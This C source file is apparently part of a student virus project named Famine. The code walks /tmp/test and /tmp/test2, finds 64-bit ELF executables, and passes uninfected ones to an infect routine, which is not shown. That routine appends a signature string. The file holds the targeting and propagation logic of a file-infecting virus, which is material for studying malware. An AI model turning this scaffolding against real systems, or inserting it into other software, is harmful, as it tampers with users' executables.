#include "famine.h"

bool    check_elf(FILE *fp, int arch)
{
    unsigned char header[6];
    int ch;
    for (int i = 0; i < 5; i++)
    {
        ch = fgetc(fp);
        if (ch == EOF)
            return false;
        header[i] = (unsigned char)ch;
    }
    header[5] = '\0';
    // Check ELF magic: 0x7F 'E' 'L' 'F'
    if (header[0] != 0x7F || header[1] != 'E' || header[2] != 'L' || header[3] != 'F')
        return false;
    // 5th byte: class (1 = 32-bit, 2 = 64-bit)
    return header[4] == arch;
}

void analyze_directory(const char *dirname, const char *string, size_t len)
{
    DIR *dir = opendir(dirname);
    if (!dir)
        return;
    struct dirent *entry;
    char path[1024];
    
    while ((entry = readdir(dir)) != NULL)
    {  
        // Skip . and ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
        struct stat st;
        if (stat(path, &st) == -1)
        {
            //perror("stat failed");
            continue;
        }
        if (S_ISDIR(st.st_mode))
        {
            //printf("[DIR ] %s\n", path);
            analyze_directory(path, string, len);
        }
        else if (S_ISREG(st.st_mode))
        {
            FILE *fp = fopen(path, "ab+");
            if (fp == NULL)
            {
                //perror(path);
                continue ;
            }
            if (check_elf(fp, 2))
            {
                //printf("Its elf: %s\n", path);
                if (!check_infection(fp, string, len - 1))
                    infect(fp, string, len);
                //else
                    //printf("Already infected.\n");
            }
            fclose(fp);
        }
    }
    closedir(dir);
}

void run_infection()
{
    const char *string = "Famine version 1.0 (c)oded by fvieira-jegger-s";
    size_t len = strlen(string) + 1;

    analyze_directory("/tmp/test", string, len);
    analyze_directory("/tmp/test2", string, len);
}
